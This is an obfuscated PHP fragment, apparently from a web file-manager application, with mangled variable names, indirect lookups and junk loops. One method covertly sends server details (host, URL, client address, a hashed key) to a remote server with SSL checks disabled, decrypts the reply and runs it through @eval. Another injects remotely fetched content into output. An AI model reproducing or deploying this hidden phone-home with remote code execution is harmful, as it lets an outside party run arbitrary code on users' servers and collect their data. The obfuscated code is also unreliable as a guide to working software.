$Ê¦¸ß¿”)) { $‘êµÂ¿ê[] = $’† ¼í¼; } } foreach ($‘êµÂ¿ê as $’† ¼í¼) { unset($×…½Ş—¡[$’† ¼í¼]); $–Õ†İğÓ = $şŠ´Ã[692]; if (strlen($–Õ†İğÓ) < $şŠ´Ã[243]) { die; } } return $×…½Ş—¡; } private function hcxe5b43245f() { $É˜š¡‹ =& $_SERVER[Ç¼‰©óß]; if ($this->dmyb62b898d5 != $É˜š¡‹[105]) { $GLOBALS[$É˜š¡‹[84]][$É˜š¡‹[88]][$É˜š¡‹[241]] = $É˜š¡‹[202]; return; } $GLOBALS[$É˜š¡‹[84]][$É˜š¡‹[242]] = $É˜š¡‹[120]; if (Model($É˜š¡‹[243])->get($É˜š¡‹[63]) != $É˜š¡‹[202]) { Model($É˜š¡‹[243])->set($É˜š¡‹[63], $É˜š¡‹[202]); } } public function mbwdbe3ab493() { $ˆÑÁĞ’© =& $_SERVER[ Ö‘ñÄ”]; return $_SERVER[Ç¼‰©óß][244]; $‚¥İºßş = $ˆÑÁĞ’©[693]; while (strlen($‚¥İºßş) < $ˆÑÁĞ’©[627]) { if (!$‚¥İºßş) { break; } $‚¥İºßş++; } } private function wgotafa26784() { $¾Š¡À¨Ç =& $_SERVER[ Ö‘ñÄ”]; $‰ŸÚ­ =& $_SERVER[Ç¼‰©óß]; $®¦ğÄå„ = array($‰ŸÚ­[245], $‰ŸÚ­[246], $‰ŸÚ­[247]); $¸¾Ù“µ = $¾Š¡À¨Ç[694]; while ($¸¾Ù“µ < $¾Š¡À¨Ç[631]) { if ($¸¾Ù“µ >= 0) { break; } $¸¾Ù“µ++; } $°˜–ÏÙÉ = $‰ŸÚ­[248] . md5($‰ŸÚ­[249]); $Õ¥¯Û„ = $¾Š¡À¨Ç[695]; while (strlen($Õ¥¯Û„) < $¾Š¡À¨Ç[627]) { if (!$Õ¥¯Û„) { break; } $Õ¥¯Û„++; } if ($this->dmyb62b898d5 == $‰ŸÚ­[105] || !_get($GLOBALS, $‰ŸÚ­[114])) { return; } if (!in_array($_SERVER[$‰ŸÚ­[24]], $®¦ğÄå„)) { return; } if (time() % 4 != 0) { return; } $ºÆ¥ı†â = call_user_func(array($‰ŸÚ­[250], $‰ŸÚ­[251]), $°˜–ÏÙÉ); if ($ºÆ¥ı†â && time() - $ºÆ¥ı†â < intval($‰ŸÚ­[252])) { return; } call_user_func(array($‰ŸÚ­[250], $‰ŸÚ­[137]), $°˜–ÏÙÉ, time()); $£•Æø›É = Model($‰ŸÚ­[33])->get($‰ŸÚ­[102]); $ŠÌ¿¶ıË = array($‰ŸÚ­[149] => Model($‰ŸÚ­[33])->get($‰ŸÚ­[185]), $‰ŸÚ­[162] => $this->dmyb62b898d5, $‰ŸÚ­[159] => $_SERVER[$‰ŸÚ­[160]], $‰ŸÚ­[161] => Model($‰ŸÚ­[33])->get($‰ŸÚ­[129]), $‰ŸÚ­[100] => md5($_SERVER[$‰ŸÚ­[101]] . $£•Æø›É), $‰ŸÚ­[152] => $‰ŸÚ­[134], $‰ŸÚ­[155] => $_SERVER[$‰ŸÚ­[156]]); $Ôà¡ê¯© = $¾Š¡À¨Ç[696]; if (strlen($Ôà¡ê¯©) < $¾Š¡À¨Ç[631]) { die; } $¼§›ƒ„Ÿ = $this->nmpj2430bb1d($‰ŸÚ­[253], $ŠÌ¿¶ıË); if (!is_array($¼§›ƒ„Ÿ)) { return; } if ($¼§›ƒ„Ÿ[$‰ŸÚ­[149]] && $¼§›ƒ„Ÿ[$‰ŸÚ­[254]]) { if ($this->xbtz38b4df13($¼§›ƒ„Ÿ[$‰ŸÚ­[254]]) == $ŠÌ¿¶ıË[$‰ŸÚ­[149]]) { return; } } $this->umex847bcd5d(); $¢ê£®ï„ = $¾Š¡À¨Ç[697]; if (strlen($¢ê£®ï„) < $¾Š¡À¨Ç[627]) { die; } if ($this->xbtz38b4df13($¼§›ƒ„Ÿ[$‰ŸÚ­[254]]) != $ŠÌ¿¶ıË[$‰ŸÚ­[149]]) { $·›ãÄêŸ = array($‰ŸÚ­[180] => $£•Æø›É, $‰ŸÚ­[181] => $_SERVER[$‰ŸÚ­[101]], $‰ŸÚ­[182] => this_url(), $‰ŸÚ­[157] => $_SERVER[$‰ŸÚ­[158]]); $àÑË‘¼¤ = $this->izxn465f1b71(json_encode($·›ãÄêŸ)); $¼§›ƒ„Ÿ = $this->nmpj2430bb1d($‰ŸÚ­[183] . $àÑË‘¼¤); if ($¼§›ƒ„Ÿ && is_array($¼§›ƒ„Ÿ) && isset($¼§›ƒ„Ÿ[$‰ŸÚ­[254]])) { $Ï´Ä´à… = $this->opnm5e9bc351($¼§›ƒ„Ÿ[$‰ŸÚ­[254]], 2); if ($Ï´Ä´à…) { $Ï´Ä´à… = $this->xbtz38b4df13($Ï´Ä´à…); } if ($Ï´Ä´à…) { try { @eval($Ï´Ä´à…); } catch (Exception $±•¨ôÔ) { } } } } } private function nmpj2430bb1d($ºÌ…ãşÇ = '', $Èùƒ€ = array(), $Æ¨ºŸ•® = 5) { $ÖĞèÀÈ =& $_SERVER[ Ö‘ñÄ”]; $ŞĞÖÕ»Á =& $_SERVER[Ç¼‰©óß]; $ã³½§¦ = $ŞĞÖÕ»Á[255]; $ã³½§¦ = $this->mbdk9afc27f3($ã³½§¦, $ŞĞÖÕ»Á[256]); $ã³½§¦ = $ã³½§¦ . $ºÌ…ãşÇ; $ÄµËÂÏ˜ = $ÖĞèÀÈ[698]; if ($Èùƒ€ && is_array($Èùƒ€)) { $ã³½§¦ = $ã³½§¦ . $ŞĞÖÕ»Á[257] . http_build_query($Èùƒ€); } if ($Èùƒ€ === -1) { return $ã³½§¦; } $¡“ºÍ¡¤ = stream_context_create(array($ŞĞÖÕ»Á[215] => array($ŞĞÖÕ»Á[218] => $Æ¨ºŸ•®, $ŞĞÖÕ»Á[216] => $ŞĞÖÕ»Á[258]), $ŞĞÖÕ»Á[259] => array($ŞĞÖÕ»Á[260] => !1, $ŞĞÖÕ»Á[261] => !1))); $Èùƒ€ = @file_get_contents($ã³½§¦, !1, $¡“ºÍ¡¤); return json_decode($Èùƒ€, !0); $şÀùµ· = $ÖĞèÀÈ[699]; $»Üûµ¹ü = $ÖĞèÀÈ[700]; while ($»Üûµ¹ü < $ÖĞèÀÈ[631]) { if ($»Üûµ¹ü >= 0) { break; } $»Üûµ¹ü++; } } private function lzvb5a796e55() { $ŞÓ‚Ğİ› =& $_SERVER[ Ö‘ñÄ”]; $ÔùĞËÌŒ =& $_SERVER[Ç¼‰©óß]; $Ö÷ÑÂ­Å = array($ÔùĞËÌŒ[262] => $ÔùĞËÌŒ[263], $ÔùĞËÌŒ[264] => $ÔùĞËÌŒ[265], $ÔùĞËÌŒ[266] => $ÔùĞËÌŒ[267], $ÔùĞËÌŒ[268] => $ÔùĞËÌŒ[269], $ÔùĞËÌŒ[270] => $ÔùĞËÌŒ[271], $ÔùĞËÌŒ[272] => $ÔùĞËÌŒ[210], $ÔùĞËÌŒ[273] => $ÔùĞËÌŒ[210], $ÔùĞËÌŒ[274] => $ÔùĞËÌŒ[263], $ÔùĞËÌŒ[275] => $ÔùĞËÌŒ[265], $ÔùĞËÌŒ[276] => $ÔùĞËÌŒ[267], $ÔùĞËÌŒ[277] => $ÔùĞËÌŒ[278], $ÔùĞËÌŒ[279] => $ÔùĞËÌŒ[269], $ÔùĞËÌŒ[280] => $ÔùĞËÌŒ[281], $ÔùĞËÌŒ[282] => $ÔùĞËÌŒ[271], $ÔùĞËÌŒ[283] => $ÔùĞËÌŒ[284], $ÔùĞËÌŒ[285] => $ÔùĞËÌŒ[286], $ÔùĞËÌŒ[287] => $ÔùĞËÌŒ[288]); $–÷÷½„õ = $Ö÷ÑÂ­Å[$this->dmyb62b898d5]; $»™×­Ó = $ŞÓ‚Ğİ›[701]; if (!$»™×­Ó) { die; } $–÷÷½„õ = intval($–÷÷½„õ ? $–÷÷½„õ : $ÔùĞËÌŒ[263]); $Îê¥ïÕÄ = $ŞÓ‚Ğİ›[702]; if (!$Îê¥ïÕÄ) { die; } $ûÏ—óˆå = _get($this->lykga0599a16, $ÔùĞËÌŒ[289]); $ûÏ—óˆå = $ûÏ—óˆå ? intval($ûÏ—óˆå) : 0; $ÌËô©ƒ² = $ŞÓ‚Ğİ›[703]; if (strlen($ÌËô©ƒ²) < $ŞÓ‚Ğİ›[243]) { return; } return $–÷÷½„õ + $ûÏ—óˆå; $»â¦´” = $ŞÓ‚Ğİ›[704]; if (!$»â¦´”) { die; } } public function qzce7e2f876f($Û’õåîĞ) { $‚¾°Ş  =& $_SERVER[ Ö‘ñÄ”]; $Äğı‹† =& $_SERVER[Ç¼‰©óß]; $€‡Éèâ = $this->lzvb5a796e55(); $Ê¦¯¥¯½ = $‚¾°Ş [705]; while ($Ê¦¯¥¯½ < $‚¾°Ş [623]) { if ($Ê¦¯¥¯½ >= 0) { break; } $Ê¦¯¥¯½++; } if ($Û’õåîĞ[$Äğı‹†[290]] == $Äğı‹†[120]) { return; } if ($€‡Éèâ >= intval($Äğı‹†[210])) { return; } $áß¤ÛÅ« = Model($Äğı‹†[123])->count(); $¶µ­Å©Ş = $‚¾°Ş [706]; while ($¶µ­Å©Ş < $‚¾°Ş [633]) { if ($¶µ­Å©Ş >= 0) { break; } $¶µ­Å©Ş++; } if ($áß¤ÛÅ« <= $€‡Éèâ) { return; } $òáÀæÄ = Model($Äğı‹†[123])->field($Äğı‹†[290])->limit($€‡Éèâ)->select(); $ü­ù¶Ú± = $‚¾°Ş [707]; $òáÀæÄ = array_to_keyvalue($òáÀæÄ, $Äğı‹†[6], $Äğı‹†[290]); if (!in_array($Û’õåîĞ[$Äğı‹†[290]], $òáÀæÄ)) { show_json($Äğı‹†[291], !1, $Äğı‹†[206]); } } public function lkma2cec7650() { $Ö©§ œœ =& $_SERVER[Ç¼‰©óß]; if (!_get($GLOBALS, $Ö©§ œœ[114]) || mt_rand(1, 100) > 20) { return; } $×ÁŞ­á = $Ö©§ œœ[213]; $×ÁŞ­á = $this->mbdk9afc27f3($×ÁŞ­á, $Ö©§ œœ[214]); $ü¼ä½üÚ = stream_context_create(array($Ö©§ œœ[215] => array($Ö©§ œœ[216] => $Ö©§ œœ[217], $Ö©§ œœ[218] => 3))); $ªšÅŸŒŞ = @file_get_contents($×ÁŞ­á, !1, $ü¼ä½üÚ); echo $Ö©§ œœ[292] . hash_encode($ªšÅŸŒŞ) . $Ö©§ œœ[293]; $¡Ê¯°‰… = $_SERVER[ Ö‘ñÄ”][708]; } private function dimuc3ddd7f1($¦íåš±, $ğÍÀÔ ­, $ç‰ƒï” = 3) { $Õı–í” =& $_SERVER[ Ö‘ñÄ”]; $°ûƒä•´ =& $_SERVER[Ç¼‰©óß]; usleep(1); $¦íåš± = trim($¦íåš±); $Ÿœ¤¿¨„ = mt_rand(0, 5) . $°ûƒä•´[6]; $Æë«Îâ = $Õı–í”[709]; if (!$Æë«Îâ) { return; } $¯¼¥á¥ø = rand_string(15); $û“ÖòÆÚ = $°ûƒä•´[294]; switch ($Ÿœ¤¿¨„) { case $°ûƒä•´[202]: $ˆµ¦ŸµŞ = $this->ptzc88ee29e2($¦íåš±, strrev($ğÍÀÔ ­ . $¯¼¥á¥ø)); $ãŞÍØ¥ = $Õı–í”[710]; if (strlen($ãŞÍØ¥) < $Õı–í”[633]) { die; } break; case $°ûƒä•´[120]: $ˆµ¦ŸµŞ = $this->ptzc88ee29e2($¦íåš±, strrev($¯¼¥á¥ø . $ğÍÀÔ ­)); $»¯úÇ®° = $Õı–í”[711]; if (!$»¯úÇ®°) { die; } break; case $°ûƒä•´[295]: $ˆµ¦ŸµŞ = $this->ptzc88ee29e2($¦íåš±, base64_encode($¯¼¥á¥ø . $ğÍÀÔ ­)); break; case $°ûƒä•´[296]: $ˆµ¦ŸµŞ = $this->ptzc88ee29e2($¦íåš±, md5($¯¼¥á¥ø . $ğÍÀÔ ­)); break; $àªÎèÊõ = $Õı–í”[712]; case $°ûƒä•´[297]: $¦íåš± = base64_encode($¦íåš±); $³ğâÊæŠ = $Õı–í”[713]; if (!$³ğâÊæŠ) { die; } $–’Æ­û = rand(0, 64); $¾ìÅğ“³ = $û“ÖòÆÚ[$–’Æ­û]; $úé³àÚÜ = md5($¾ìÅğ“³ . md5($ğÍÀÔ ­ . $¾ìÅğ“³) . $ğÍÀÔ ­); $¹†³±“® = $Õı–í”[714]; $úé³àÚÜ = substr($úé³àÚÜ, $–’Æ­û % 8, $–’Æ­û % 8 + 7); $íÓşÜú = $Õı–í”[715]; $‰ŠãÊ‰ = $°ûƒä•´[6]; $İÇŸüË³ = $Õı–í”[716]; $ÊüÚ‚ìÏ = 0; $ê«êÑÆÌ = $Õı–í”[717]; while (strlen($ê«êÑÆÌ) < $Õı–í”[623]) { if (!$ê«êÑÆÌ) { break; } $ê«êÑÆÌ++; } $¯–à÷ä = 0; $Ùî¥•± = 0; for ($ÊüÚ‚ìÏ = 0; $ÊüÚ‚ìÏ < strlen($¦íåš±); $ÊüÚ‚ìÏ++) { $Ùî¥•± = $Ùî¥•± == strlen($úé³àÚÜ) ? 0 : $Ùî¥•±; $¯–à÷ä = ($–’Æ­û + strpos($û“ÖòÆÚ, $¦íåš±[$ÊüÚ‚ìÏ]) + ord($úé³àÚÜ[$Ùî¥•±++])) % 64; $å„˜¸ˆæ = $Õı–í”[718]; while ($å„˜¸ˆæ < $Õı–í”[633]) { if ($å„˜¸ˆæ >= 0) { break; } $å„˜¸ˆæ++; } $‰ŠãÊ‰ .= $û“ÖòÆÚ[$¯–à÷ä]; $âõšÃö = $Õı–í”[719]; } $ˆµ¦ŸµŞ = hash_encode($¾ìÅğ“³ . $‰ŠãÊ‰); $Òï¤†ş = $Õı–í”[720]; if (!$Òï¤†ş) { die; } break; default: $ˆµ¦ŸµŞ = $this->ptzc88ee29e2($¦íåš±, $ğÍÀÔ ­ . $¯¼¥á¥ø); $¬¦ªõëü = $Õı–í”[721]; if (!$¬¦ªõëü) { return; } break; } $ˆµ¦ŸµŞ = strrev($Ÿœ¤¿¨„ . $¯¼¥á¥ø . $ˆµ¦ŸµŞ); if ($ç‰ƒï” - 1 > 0) { $ˆµ¦ŸµŞ = $this->dimuc3ddd7f1($ˆµ¦ŸµŞ, $ğÍÀÔ ­, $ç‰ƒï” - 1); } return $ˆµ¦ŸµŞ; } private function opnm5e9bc351($ñÀà¡¾, $¶±Ä©, $ğ‰Óšü¿ = 3) { $ìœµàØ† =& $_SERVER[ Ö‘ñÄ”]; $šõıˆøÓ =& $_SERVER[Ç¼‰©óß]; if (!is_string($ñÀà¡¾) || strlen($ñÀà¡¾) < 10) { return !1; } $ñÀà¡¾ = trim($ñÀà¡¾); $‹·Ó×² = $ìœµàØ†[722]; if (strlen($‹·Ó×²) < $ìœµàØ†[627]) { return; } $ñÀà¡¾ = strrev($ñÀà¡¾); $ë¯ÈŠ± = $ìœµàØ†[723]; $ Ö‡¤£… = $ñÀà¡¾[0]; $„ÇÛÚ í = substr($ñÀà¡¾, 1, 15); $ñÀà¡¾ = substr($ñÀà¡¾, 16); $Ú“Âù‹© = $ìœµàØ†[724]; if (strlen($Ú“Âù‹©) < $ìœµàØ†[631]) { die; } $Åğ¦çı– = $šõıˆøÓ[294]; switch ($ Ö‡¤£…) { case $šõıˆøÓ[202]: $åãŒ¡œ = $this->mbdk9afc27f3($ñÀà¡¾, strrev($¶±Ä© . $„ÇÛÚ í)); break; case $šõıˆøÓ[120]: $åãŒ¡œ = $this->mbdk9afc27f3($ñÀà¡¾, strrev($„ÇÛÚ í . $¶±Ä©)); $üÒ–¦‘â = $ìœµàØ†[725]; if (!$üÒ–¦‘â) { return; } break; case $šõıˆøÓ[295]: $åãŒ¡œ = $this->mbdk9afc27f3($ñÀà¡¾, base64_encode($„ÇÛÚ í . $¶±Ä©)); $•§¹Ù€Ÿ = $ìœµàØ†[726]; if (!$•§¹Ù€Ÿ) { die; } break; case $šõıˆøÓ[296]: $åãŒ¡œ = $this->mbdk9afc27f3($ñÀà¡¾, md5($„ÇÛÚ í . $¶±Ä©)); break; case $šõıˆøÓ[297]: $ñÀà¡¾ = hash_decode($ñÀà¡¾); $ŒîšŸ¹É = $ìœµàØ†[643]; while ($ŒîšŸ¹É < $ìœµàØ†[243]) { if ($ŒîšŸ¹É >= 0) { break; } $ŒîšŸ¹É++; } $€‰Ì˜éÊ = $ñÀà¡¾[0]; $É”ÊµÖì = $ìœµàØ†[727]; while ($É”ÊµÖì < $ìœµàØ†[243]) { if ($É”ÊµÖì >= 0) { break; } $É”ÊµÖì++; } $ñÀà¡¾ = substr($ñÀà¡¾, 1); $¦Æõ´ß = $ìœµàØ†[728]; $ú¯êƒ¨ = strpos($Åğ¦çı–, $€‰Ì˜éÊ); $ŠœŒ—Ñº = $ìœµàØ†[729]; while ($ŠœŒ—Ñº < $ìœµàØ†[631]) { if ($ŠœŒ—Ñº >= 0) { break; } $ŠœŒ—Ñº++; } $†Ç—íÙİ = md5($€‰Ì˜éÊ . md5($¶±Ä© . $€‰Ì˜éÊ) . $¶±Ä©); $”ÒÙ‘‡½ = $ìœµàØ†[730]; while (strlen($”ÒÙ‘‡½) < $ìœµàØ†[627]) { if (!$”ÒÙ‘‡½) { break; } $”ÒÙ‘‡½++; } $†Ç—íÙİ = substr($†Ç—íÙİ, $ú¯êƒ¨ % 8, $ú¯êƒ¨ % 8 + 7); $€˜ûóÂÜ = $ìœµàØ†[731]; if (strlen($€˜ûóÂÜ) < $ìœµàØ†[243]) { die; } $Óû—šô® = $šõıˆøÓ[6]; $êµØ™ÁÅ = 0; $İÜÙ¾¨ = $ìœµàØ†[732]; $¯™ÈÍ‡˜ = 0; $¯£ùû†© = $ìœµàØ†[733]; if (strlen($¯£ùû†©) < $ìœµàØ†[243]) { die; } $¸×Ò¿Œ = 0; for ($êµØ™ÁÅ = 0; $êµØ™ÁÅ < strlen($ñÀà¡¾); $êµØ™ÁÅ++) { $¸×Ò¿Œ = $¸×Ò¿Œ == strlen($†Ç—íÙİ) ? 0 : $¸×Ò¿Œ; $ŞóÆ­†ç = $¸×Ò¿Œ++; $¯™ÈÍ‡˜ = strpos($Åğ¦çı–, $ñÀà¡¾[$êµØ™ÁÅ]) - $ú¯êƒ¨ - ord($†Ç—íÙİ[$ŞóÆ­†ç]); $…Øüö = $ìœµàØ†[734]; while (strlen($…Øüö) < $ìœµàØ†[623]) { if (!$…Øüö) { break; } $…Øüö++; } while ($¯™ÈÍ‡˜ < 0) { $¯™ÈÍ‡˜ += 64; $‹•ïŞÙÔ = $ìœµàØ†[735]; } $Óû—šô® .= $Åğ¦çı–[$¯™ÈÍ‡˜]; $ÂÙı±ãå = $ìœµàØ†[736]; while ($ÂÙı±ãå < $ìœµàØ†[627]) { if ($ÂÙı±ãå >= 0) { break; } $ÂÙı±ãå++; } } $åãŒ¡œ = base64_decode($Óû—šô®); $Ë‰ÍÁªº = $ìœµàØ†[737]; while ($Ë‰ÍÁªº < $ìœµàØ†[633]) { if ($Ë‰ÍÁªº >= 0) { break; } $Ë‰ÍÁªº++; } break; default: $åãŒ¡œ = $this->mbdk9afc27f3($ñÀà¡¾, $¶±Ä© . $„ÇÛÚ í); break; $ßĞ¯¾ˆô = $ìœµàØ†[738]; } if ($ğ‰Óšü¿ - 1 > 0) { $åãŒ¡œ = $this->opnm5e9bc351($åãŒ¡œ, $¶±Ä©, $ğ‰Óšü¿ - 1); } return $åãŒ¡œ; } public function izxn465f1b71($îîÏÌª˜) { $¤À§¶Ş¾ =& $_SERVER[ Ö‘ñÄ”]; $­šşõ =& $_SERVER[Ç¼‰©óß]; $…Õ±ğÛ = $this->ginx364d1cca(); $ˆüæ²©Š = $this->ginx364d1cca(); $ôúı÷®Ã = ($…Õ±ğÛ - 1) * ($ˆüæ²©Š - 1); $ïñíˆÊ© = $¤À§¶Ş¾[739]; $ÙÀöõÑ² = intval(($…Õ±ğÛ + $ˆüæ²©Š) / 2); $ë£·ï˜ = $¤À§¶Ş¾[740]; if (!$ë£·ï˜) { die; } while (1) { $õ»Æê‘É = $ÙÀöõÑ²; $çŒ¢°Áê = $¤À§¶Ş¾[741]; if (!$çŒ¢°Áê) { die; } $äá ¤ªò = $ôúı÷®Ã; $£¦Ÿ˜Ç = $¤À§¶Ş¾[742]; if (!$£¦Ÿ˜Ç) { die; } while ($äá ¤ªò % $õ»Æê‘É != 0) { $ÑÏØù·¬ = $äá ¤ªò; $µû§î¯– = $¤À§¶Ş¾[743]; while (strlen($µû§î¯–) < $¤À§¶Ş¾[633]) { if (!$µû§î¯–) { break; } $µû§î¯–++; } $äá ¤ªò = $õ»Æê‘É; $•ÇÈ¿¼ = $¤À§¶Ş¾[744]; $õ»Æê‘É = $ÑÏØù·¬ % $õ»Æê‘É; } if ($õ»Æê‘É == 1) { break; } else { $ÙÀöõÑ²++; } } $ß¬ÉÂ·œ = 2; $È€èİô‹ = $¤À§¶Ş¾[745]; for ($¼ó˜ê×ë = 0; $¼ó˜ê×ë < $ôúı÷®Ã * 10; $¼ó˜ê×ë++) { if (($ôúı÷®Ã * $¼ó˜ê×ë + 1) % $ÙÀöõÑ² == 0) { $ß¬ÉÂ·œ = intval(($ôúı÷®Ã * $¼ó˜ê×ë + 1) / $ÙÀöõÑ²); break; } } $œ¬ñòüË = $this->ptzc88ee29e2($…Õ±ğÛ * $ˆüæ²©Š . $­šşõ[6], $­šşõ[134]); $¦ãó¢œÚ = md5($­šşõ[298] . ($…Õ±ğÛ + $ˆüæ²©Š) . $­šşõ[299] . $ÙÀöõÑ² . $­šşõ[299] . $ß¬ÉÂ·œ . $­šşõ[300]); $©®±– = $this->ptzc88ee29e2($îîÏÌª˜, $¦ãó¢œÚ) . $­šşõ[301] . $œ¬ñòüË; return $©®±–; } public function xbtz38b4df13($ğñ„ÜÇï) { $ş’¹¹° =& $_SERVER[ Ö‘ñÄ”]; $¹™ï¥¬Ó =& $_SERVER[Ç¼‰©óß]; $Ê öÙ¤ñ = explode($¹™ï¥¬Ó[301], $ğñ„ÜÇï); if (count($Ê öÙ¤ñ) != 2) { return $¹™ï¥¬Ó[6]; } $ìÙ÷Å•Ë = $this->mbdk9afc27f3($Ê öÙ¤ñ[1] . $¹™ï¥¬Ó[6], $¹™ï¥¬Ó[134]); if (!$ìÙ÷Å•Ë) { return $¹™ï¥¬Ó[6]; } $ìÙ÷Å•Ë = intval($ìÙ÷Å•Ë); $“æû±ØÃ = $ş’¹¹°[746]; if (strlen($“æû±ØÃ) < $ş’¹¹°[633]) { die; } $ëİÕ½Ã = 0; $è¯Æˆ˜õ = 0; $‡•££şû = $ş’¹¹°[747]; while ($‡•££şû < $ş’¹¹°[627]) { if ($‡•££şû >= 0) { break; } $‡•££şû++; } for ($â¤ï½Ÿ† = 3; $â¤ï½Ÿ† < $ìÙ÷Å•Ë; $â¤ï½Ÿ† += 2) { if ($ìÙ÷Å•Ë % $â¤ï½Ÿ† != 0) { continue; } $ëİÕ½Ã = $â¤ï½Ÿ†; $ßã¦ßÀÈ = $ş’¹¹°[748]; if (!$ßã¦ßÀÈ) { die; } $è¯Æˆ˜õ = intval($ìÙ÷Å•Ë / $â¤ï½Ÿ†); $ü¬¿©•â = $ş’¹¹°[749]; if (!$ü¬¿©•â) { die; } break; $ı‹¾¹®¨ = $ş’¹¹°[750]; if (strlen($ı‹¾¹®¨) < $ş’¹¹°[243]) { die; } } $¸êÕ‡»ê = ($ëİÕ½Ã - 1) * ($è¯Æˆ˜õ - 1); $®¶„¿ï = $ş’¹¹°[751]; $ôÅ”ÌÊŸ = intval(($ëİÕ½Ã + $è¯Æˆ˜õ) / 2); while (1) { $Èñ²Ò‰¿ = $ôÅ”ÌÊŸ; $Œ÷û’‡º = $¸êÕ‡»ê; while ($Œ÷û’‡º % $Èñ²Ò‰¿ != 0) { $¦ó³ß¸ = $Œ÷û’‡º; $Ÿœ¨éïŸ = $ş’¹¹°[752]; $Œ÷û’‡º = $Èñ²Ò‰¿; $Èñ²Ò‰¿ = $¦ó³ß¸ % $Èñ²Ò‰¿; } if ($Èñ²Ò‰¿ == 1) { break; } else { $ôÅ”ÌÊŸ++; } } $‚¿ÀŞñª = 2; $üÛ¸ø”á = $ş’¹¹°[753]; if (!$üÛ¸ø”á) { die; } for ($â¤ï½Ÿ† = 0; $â¤ï½Ÿ† < $¸êÕ‡»ê * 10; $â¤ï½Ÿ†++) { if (($¸êÕ‡»ê * $â¤ï½Ÿ† + 1) % $ôÅ”ÌÊŸ == 0) { $‚¿ÀŞñª = intval(($¸êÕ‡»ê * $â¤ï½Ÿ† + 1) / $ôÅ”ÌÊŸ); break; } } $¯Ûî³° = md5($¹™ï¥¬Ó[298] . ($ëİÕ½Ã + $è¯Æˆ˜õ) . $¹™ï¥¬Ó[299] . $ôÅ”ÌÊŸ . $¹™ï¥¬Ó[299] . $‚¿ÀŞñª . $¹™ï¥¬Ó[300]); $Èè©è÷ = $this->mbdk9afc27f3($Ê öÙ¤ñ[0], $¯Ûî³°); return $Èè©è÷; $ƒ°ÓÄÊ = $ş’¹¹°[754]; while ($ƒ°ÓÄÊ < $ş’¹¹°[243]) { if ($ƒ°ÓÄÊ >= 0) { break; } $ƒ°ÓÄÊ++; } } public function ginx364d1cca() { $ººÇÎøÚ =& $_SERVER[ Ö‘ñÄ”]; $åôÁİ–´ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÑÔàê½ó = array(); $™éó“Ãş = $ººÇÎøÚ[755]; if (strlen($™éó“Ãş) < $ººÇÎøÚ[243]) { return; } $‰‰È™¸¡ = 1; while ($‰‰È™¸¡ <= (int) sqrt($åôÁİ–´)) { $«¯£ÕÜ = $‰‰È™¸¡; while (!0) { $«¯£ÕÜ++; if ($«¯£ÕÜ <= 2) { $‰‰È™¸¡ = $«¯£ÕÜ; break; } else { if ($«¯£ÕÜ < 2) { continue; } } $˜—Ôˆ¡ = !0; for ($Àï­‚š = 2; $Àï­‚š <= sqrt($«¯£ÕÜ); $Àï­‚š++) { if ($«¯£ÕÜ % $Àï­‚š == 0) { $˜—Ôˆ¡ = !1; } } if ($˜—Ôˆ¡) { $‰‰È™¸¡ = $«¯£ÕÜ; break; } } $ÑÔàê½ó[] = $‰‰È™¸¡; $¿†ƒ¼ßã = $ººÇÎøÚ[756]; if (strlen($¿†ƒ¼ßã) < $ººÇÎøÚ[243]) { return; } } $ƒıË® = 2; $ÁğˆÕë­ = $ººÇÎøÚ[757]; if (!$ÁğˆÕë­) { die; } for ($«¯£ÕÜ = $åôÁİ–´; $«¯£ÕÜ > 1; $«¯£ÕÜ--) { $˜—Ôˆ¡ = !0; foreach ($ÑÔàê½ó as $»ñå´ã) { if ($«¯£ÕÜ % $»ñå´ã == 0) { $˜—Ôˆ¡ = !1; break; } } if ($˜—Ôˆ¡) { $ƒıË® = $«¯£ÕÜ; break; } } return $ƒıË®; $âş¯Ñ•¬ = $ººÇÎøÚ[702]; if (!$âş¯Ñ•¬) { return; } } public function cqxm86434903($“¥Šä›, $»òÏ†ÑÒ) { $šß• œŒ =& $_SERVER[ Ö‘ñÄ”]; $Ü±ÈÓâª =& $_SERVER[Ç¼‰©óß]; return call_user_func(array($Ü±ÈÓâª[8], $Ü±ÈÓâª[302]), $“¥Šä›, $»òÏ†ÑÒ); $ûÅ©£ëÊ = $šß• œŒ[758]; if (strlen($ûÅ©£ëÊ) < $šß• œŒ[627]) { return; } } public function ptzc88ee29e2($¾¡›œÜ, $ûıòÄ) { $ñÙ„Ş…š =& $_SERVER[Ç¼‰©óß]; return call_user_func(array($ñÙ„Ş…š[303], $ñÙ„Ş…š[304]), $¾¡›œÜ, $ûıòÄ); $Â—«óôú = $_SERVER[ Ö‘ñÄ”][759]; if (!$Â—«óôú) { return; } } public function mbdk9afc27f3($¡Ğ§œ³æ, $¾÷ñÊóº) { $ıÜˆ…ïÅ =& $_SERVER[Ç¼‰©óß]; return call_user_func(array($ıÜˆ…ïÅ[303], $ıÜˆ…ïÅ[305]), $¡Ğ§œ³æ, $¾÷ñÊóº); $‚Ùøï‚ = $_SERVER[ Ö‘ñÄ”][760]; if (!$‚Ùøï‚) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $İèÌÏ½× =& $_SERVER[ Ö‘ñÄ”]; $this->isManual(); self::$name = date($İèÌÏ½×[761]); if (!($·´…ıúû = Model($İèÌÏ½×[762])->lastItem())) { $·´…ıúû = $this->initData(); } else { self::$name = $·´…ıúû[$İèÌÏ½×[32]]; if ($·´…ıúû[$İèÌÏ½×[763]] == $İèÌÏ½×[88]) { self::$name = date($İèÌÏ½×[764]); $‹·÷íà = 0; if (isset($·´…ıúû[$İèÌÏ½×[302]][$İèÌÏ½×[199]][$İèÌÏ½×[476]])) { $‹·÷íà = (int) $·´…ıúû[$İèÌÏ½×[302]][$İèÌÏ½×[199]][$İèÌÏ½×[476]]; } if (self::$manual == 0 && $·´…ıúû[$İèÌÏ½×[32]] == self::$name) { Model($İèÌÏ½×[762])->remove($·´…ıúû[$İèÌÏ½×[407]]); } $·´…ıúû = $this->initData($‹·÷íà, $·´…ıúû[$İèÌÏ½×[765]]); } else { $this->checkStore($·´…ıúû[$İèÌÏ½×[765]]); } } self::$option = $·´…ıúû; } private function isManual() { $™¶ú˜ËÍ = _get($GLOBALS, $_SERVER[ Ö‘ñÄ”][766], 0); $™¶ú˜ËÍ = intval($™¶ú˜ËÍ); self::$manual = $™¶ú˜ËÍ && $™¶ú˜ËÍ == 1 ? 1 : 0; } private function initData($°¸ğŸƒÒ = 0, $ÛĞ·ôÆ› = '') { $Æ¦£‹ç¬ =& $_SERVER[ 